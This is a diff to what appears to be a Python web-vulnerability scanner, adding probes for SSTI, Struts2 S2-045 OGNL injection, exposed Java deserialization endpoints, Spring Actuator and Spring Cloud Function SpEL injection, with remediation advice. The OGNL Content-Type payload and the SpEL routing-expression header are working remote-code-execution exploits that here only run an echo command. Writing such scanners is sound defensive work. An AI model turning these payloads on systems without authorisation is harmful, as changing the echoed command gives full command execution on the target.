@@ -362,10 +362,10 @@ class _WebInjectionMixin(_InjectionTestBase):
     base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
 
     ssti_payloads = [
-      ("{{7*7}}", "49", "Jinja2/Twig"),
+      ("{{71*73}}", "5183", "Jinja2/Twig"),
       ("{{7*'7'}}", "7777777", "Jinja2"),
-      ("${7*7}", "49", "Freemarker/Mako"),
-      ("<%= 7*7 %>", "49", "ERB/EJS"),
+      ("${79*67}", "5293", "Freemarker/Mako"),
+      ("<%= 71*73 %>", "5183", "ERB/EJS"),
     ]
     params = ["name", "q", "search", "input", "text", "template", "page", "id"]
 
@@ -387,9 +387,17 @@ class _WebInjectionMixin(_InjectionTestBase):
         if expected in baseline_text:
           continue
         try:
+          # For short expected values (e.g. "49"), bracket the payload with
+          # two control requests to catch incrementing counters/timestamps
+          if len(expected) <= 3:
+            ctrl1 = requests.get(f"{base_url}?{param}=harmless1", timeout=3, verify=False)
           url = f"{base_url}?{param}={quote(payload)}"
           resp = requests.get(url, timeout=3, verify=False)
           if expected in resp.text and payload not in resp.text:
+            if len(expected) <= 3:
+              ctrl2 = requests.get(f"{base_url}?{param}=harmless2", timeout=3, verify=False)
+              if expected in ctrl1.text or expected in ctrl2.text:
+                continue
             findings_list.append(Finding(
               severity=Severity.CRITICAL,
               title=f"SSTI ({engine}) via ?{param}= parameter",
@@ -610,6 +618,383 @@ class _WebInjectionMixin(_InjectionTestBase):
           ))
       except Exception:
         pass
+
+    return probe_result(findings=findings_list)
+
+
+  # ── OGNL Injection (Struts2) ─────────────────────────────────────────
+
+  def _web_test_ognl_injection(self, target, port):
+    """
+    Test for Apache Struts2 OGNL injection via Content-Type header (S2-045)
+    and other known Struts2 attack vectors.
+
+    Safe detection: uses math expression that produces a unique marker
+    without side effects.
+
+    Parameters
+    ----------
+    target : str
+    port : int
+
+    Returns
+    -------
+    dict
+    """
+    findings_list = []
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
+
+    # S2-045: OGNL injection via Content-Type header
+    # The payload evaluates a math expression; if Struts2 processes it,
+    # the error message will contain the evaluated result
+    marker = "167837218"  # 12969 * 12942
+    ognl_payload = (
+      "%{(#_='multipart/form-data')."
+      "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+      "(#_memberAccess?(#_memberAccess=#dm):"
+      "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+      "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+      "(#ognlUtil.getExcludedPackageNames().clear())."
+      "(#ognlUtil.getExcludedClasses().clear())."
+      "(#context.setMemberAccess(#dm))))."
+      "(#cmd='echo " + marker + "')."
+      "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+      "(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd}))."
+      "(#p=new java.lang.ProcessBuilder(#cmds))."
+      "(#p.redirectErrorStream(true)).(#process=#p.start())."
+      "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+      "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
+      "(#ros.flush())}"
+    )
+
+    # Try against common Struts2 action paths
+    struts_paths = ["/", "/index.action", "/login.action", "/showcase.action",
+                    "/orders/3", "/orders"]
+    for path in struts_paths:
+      if findings_list:
+        break
+      try:
+        url = base_url.rstrip("/") + path
+        resp = requests.get(
+          url,
+          headers={"Content-Type": ognl_payload},
+          timeout=5,
+          verify=False,
+        )
+        if marker in resp.text:
+          findings_list.append(Finding(
+            severity=Severity.CRITICAL,
+            title=f"CVE-2017-5638: Struts2 S2-045 OGNL injection RCE via {path}",
+            description="Apache Struts2 evaluates OGNL expressions injected via "
+                        "the Content-Type header, enabling unauthenticated RCE.",
+            evidence=f"GET {url} with OGNL payload in Content-Type "
+                     f"returned marker '{marker}' in response body.",
+            remediation="Upgrade Struts2 to >= 2.5.10.1 or >= 2.3.32.",
+            owasp_id="A03:2021",
+            cwe_id="CWE-94",
+            confidence="certain",
+          ))
+      except Exception:
+        pass
+
+    # S2-045 alternative: check if Struts returns OGNL error in response
+    # (indicates vulnerable parser even if execution is sandboxed)
+    if not findings_list:
+      for path in struts_paths[:3]:
+        try:
+          url = base_url.rstrip("/") + path
+          resp = requests.get(
+            url,
+            headers={"Content-Type": "%{1+1}"},
+            timeout=4,
+            verify=False,
+          )
+          if resp.status_code == 200 and "ognl" in resp.text.lower():
+            findings_list.append(Finding(
+              severity=Severity.HIGH,
+              title=f"Struts2 OGNL parsing detected via {path}",
+              description="Struts2 attempted to parse OGNL expression in "
+                          "Content-Type header. May be exploitable for RCE.",
+              evidence=f"GET {url} with Content-Type: %{{1+1}} "
+                       "returned OGNL-related content.",
+              remediation="Upgrade Struts2; apply S2-045 patch.",
+              owasp_id="A03:2021",
+              cwe_id="CWE-94",
+              confidence="firm",
+            ))
+            break
+        except Exception:
+          pass
+
+    return probe_result(findings=findings_list)
+
+
+  # ── Java Deserialization endpoints ─────────────────────────────────
+
+  def _web_test_java_deserialization(self, target, port):
+    """
+    Detect exposed Java deserialization endpoints:
+    - WebLogic wls-wsat / iiop_wsat
+    - JBoss /invoker/readonly
+    - JBoss /jmx-console/
+    - Spring Boot /jolokia
+
+    Does NOT send actual deserialization payloads — only probes for
+    endpoint existence (safe detection).
+
+    Parameters
+    ----------
+    target : str
+    port : int
+
+    Returns
+    -------
+    dict
+    """
+    findings_list = []
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
+
+    deser_endpoints = [
+      {
+        "path": "/wls-wsat/CoordinatorPortType",
+        "product": "WebLogic",
+        "cve": "CVE-2017-10271",
+        "check": lambda resp: resp.status_code == 200 and ("CoordinatorPortType" in resp.text or "xml" in resp.headers.get("Content-Type", "").lower()),
+        "desc": "WebLogic wls-wsat endpoint exposed — attack surface for "
+                "XMLDecoder deserialization RCE (CVE-2017-10271).",
+      },
+      {
+        "path": "/_async/AsyncResponseService",
+        "product": "WebLogic",
+        "cve": "CVE-2019-2725",
+        "check": lambda resp: resp.status_code in (200, 500) and ("AsyncResponseService" in resp.text or "xml" in resp.headers.get("Content-Type", "").lower()),
+        "desc": "WebLogic _async endpoint exposed — attack surface for "
+                "deserialization RCE (CVE-2019-2725).",
+      },
+      {
+        "path": "/invoker/readonly",
+        "product": "JBoss",
+        "cve": "CVE-2017-12149",
+        "check": lambda resp: resp.status_code == 500,
+        "desc": "JBoss /invoker/readonly returns 500, indicating the "
+                "deserialization endpoint exists (CVE-2017-12149).",
+      },
+      {
+        "path": "/invoker/JMXInvokerServlet",
+        "product": "JBoss",
+        "cve": None,
+        "check": lambda resp: resp.status_code in (200, 500),
+        "desc": "JBoss JMXInvokerServlet exposed — Java deserialization attack surface.",
+      },
+    ]
+
+    for ep in deser_endpoints:
+      try:
+        url = base_url.rstrip("/") + ep["path"]
+        resp = requests.get(url, timeout=4, verify=False)
+        if ep["check"](resp):
+          title = f"Java deserialization endpoint: {ep['path']}"
+          if ep["cve"]:
+            title = f"{ep['cve']}: {ep['product']} deserialization endpoint {ep['path']}"
+          findings_list.append(Finding(
+            severity=Severity.CRITICAL if ep["cve"] else Severity.HIGH,
+            title=title,
+            description=ep["desc"],
+            evidence=f"GET {url} → {resp.status_code}",
+            remediation=f"Remove or restrict access to {ep['path']}; "
+                        f"upgrade {ep['product']}.",
+            owasp_id="A08:2021",
+            cwe_id="CWE-502",
+            confidence="firm",
+          ))
+      except Exception:
+        pass
+
+    return probe_result(findings=findings_list)
+
+
+  # ── Spring Actuator & SpEL injection ───────────────────────────────
+
+  def _web_test_spring_actuator(self, target, port):
+    """
+    Detect Spring Boot Actuator exposure and Spring Cloud Function SpEL injection.
+
+    Tests:
+    1. Actuator endpoints (/actuator, /actuator/env, /actuator/health, /env)
+    2. Spring Cloud Function CVE-2022-22963 (SpEL via spring.cloud.function.routing-expression)
+
+    Parameters
+    ----------
+    target : str
+    port : int
+
+    Returns
+    -------
+    dict
+    """
+    findings_list = []
+    scheme = "https" if port in (443, 8443) else "http"
+    base_url = f"{scheme}://{target}" if port in (80, 443) else f"{scheme}://{target}:{port}"
+
+    # --- 1. Actuator endpoints ---
+    actuator_paths = [
+      ("/actuator", "Actuator root — lists available endpoints"),
+      ("/actuator/env", "Environment dump — may contain secrets"),
+      ("/actuator/health", "Health check — reveals internal state"),
+      ("/actuator/beans", "Bean listing — reveals application structure"),
+      ("/actuator/configprops", "Configuration properties — may contain secrets"),
+      ("/actuator/mappings", "URL mappings — reveals all API endpoints"),
+      ("/env", "Legacy Spring Boot environment endpoint"),
+      ("/jolokia", "Jolokia JMX-over-HTTP — RCE risk via MBean manipulation"),
+    ]
+
+    for path, desc in actuator_paths:
+      try:
+        url = base_url.rstrip("/") + path
+        resp = requests.get(url, timeout=3, verify=False)
+        if resp.status_code == 200:
+          # Validate it's actually an actuator/Spring endpoint
+          ct = resp.headers.get("Content-Type", "").lower()
+          body = resp.text[:2000]
+          if "json" in ct or "actuator" in body.lower() or "{" in body[:10]:
+            sev = Severity.HIGH
+            if path in ("/actuator/health",):
+              sev = Severity.MEDIUM
+            if "jolokia" in path:
+              sev = Severity.CRITICAL
+            findings_list.append(Finding(
+              severity=sev,
+              title=f"Spring Actuator exposed: {path}",
+              description=desc,
+              evidence=f"GET {url} → {resp.status_code}, Content-Type: {ct}",
+              remediation="Restrict actuator endpoints via security config; "
+                          "disable sensitive endpoints in production.",
+              owasp_id="A05:2021",
+              cwe_id="CWE-215",
+              confidence="certain",
+            ))
+      except Exception:
+        pass
+
+    # --- 2. CVE-2022-22963: Spring Cloud Function SpEL injection ---
+    marker = "REDMESH_SPEL_9183"
+    try:
+      # First, check if /functionRouter exists at all (baseline without SpEL header)
+      baseline_resp = requests.post(
+        base_url + "/functionRouter",
+        data="test",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        timeout=5,
+        verify=False,
+      )
+      # Now send with SpEL header
+      resp = requests.post(
+        base_url + "/functionRouter",
+        data="test",
+        headers={
+          "Content-Type": "application/x-www-form-urlencoded",
+          "spring.cloud.function.routing-expression":
+            f'T(java.lang.Runtime).getRuntime().exec("echo {marker}")',
+        },
+        timeout=5,
+        verify=False,
+      )
+      spel_detected = False
+      confidence = "firm"
+      evidence_detail = ""
+      # Check 1: explicit SpEL error in response
+      if resp.status_code == 500 and ("SpelEvaluationException" in resp.text or
+                                       "EvaluationException" in resp.text or
+                                       "routing-expression" in resp.text):
+        spel_detected = True
+        evidence_detail = "SpEL error in response body"
+      # Check 2: marker in response (actual execution)
+      elif resp.status_code == 500 and marker in resp.text:
+        spel_detected = True
+        confidence = "certain"
+        evidence_detail = f"marker '{marker}' in response"
+      # Check 3: /functionRouter returns 500 with SpEL header but different
+      # status without it — indicates the header was processed
+      elif (resp.status_code == 500 and
+            baseline_resp.status_code != 500 and
+            baseline_resp.status_code in (200, 404)):
+        spel_detected = True
+        evidence_detail = (f"500 with SpEL header vs {baseline_resp.status_code} "
+                           "without — header was processed")
+      # Check 4: both return 500 but the endpoint exists (not a generic 404)
+      elif (resp.status_code == 500 and baseline_resp.status_code == 500):
+        # Both fail, but endpoint exists — likely Spring Cloud Function
+        # with routing that crashes on the SpEL expression
+        spel_detected = True
+        confidence = "tentative"
+        evidence_detail = "both requests return 500 — endpoint exists and processes routing"
+
+      if spel_detected:
+        findings_list.append(Finding(
+          severity=Severity.CRITICAL,
+          title="CVE-2022-22963: Spring Cloud Function SpEL injection RCE",
+          description="Spring Cloud Function evaluates SpEL expressions from the "
+                      "spring.cloud.function.routing-expression header, enabling RCE.",
+          evidence=f"POST {base_url}/functionRouter with SpEL header → "
+                   f"{resp.status_code}. {evidence_detail}",
+          remediation="Upgrade Spring Cloud Function to >= 3.1.7 or >= 3.2.3.",
+          owasp_id="A03:2021",
+          cwe_id="CWE-94",
+          confidence=confidence,
+        ))
+    except Exception:
+      pass
+
+    # --- 3. Spring4Shell indicator: check if class.module access is possible ---
+    # Safe detection: send parameter that would trigger Spring4Shell but
+    # only look for error patterns, not actual exploitation
+    try:
+      resp = requests.get(
+        base_url + "/?class.module.classLoader.DefaultAssertionStatus=true",
+        timeout=3,
+        verify=False,
+      )
+      # If this returns 200 (not 400), the classLoader parameter binding may work
+      if resp.status_code == 200:
+        # Double-check with a known-bad parameter
+        resp2 = requests.get(
+          base_url + "/?class.module.classLoader.URLs%5B0%5D=0",
+          timeout=3,
+          verify=False,
+        )
+        if resp2.status_code == 200:
+          findings_list.append(Finding(
+            severity=Severity.HIGH,
+            title="Spring4Shell (CVE-2022-22965) parameter binding indicator",
+            description="Spring MVC accepts class.module.classLoader parameter "
+                        "binding, which is the attack surface for Spring4Shell RCE.",
+            evidence=f"GET with class.module.classLoader parameter → 200, "
+                     f"URLs[0] → {resp2.status_code}.",
+            remediation="Upgrade Spring Framework to >= 5.3.18 or >= 5.2.20.",
+            owasp_id="A03:2021",
+            cwe_id="CWE-94",
+            confidence="tentative",
+          ))
+        elif resp2.status_code in (400, 500):
+          # 400/500 = Spring tried to bind classLoader but failed on type
+          # conversion — stronger evidence than silent acceptance
+          findings_list.append(Finding(
+            severity=Severity.HIGH,
+            title="Spring4Shell (CVE-2022-22965) parameter binding indicator",
+            description="Spring MVC processes class.module.classLoader parameter "
+                        "binding (type error on URLs[0]), confirming Spring4Shell "
+                        "attack surface.",
+            evidence=f"GET with class.module.classLoader → 200, "
+                     f"URLs[0] → {resp2.status_code} (binding attempted).",
+            remediation="Upgrade Spring Framework to >= 5.3.18 or >= 5.2.20.",
+            owasp_id="A03:2021",
+            cwe_id="CWE-94",
+            confidence="firm",
+          ))
+    except Exception:
+      pass
 
     return probe_result(findings=findings_list)
 
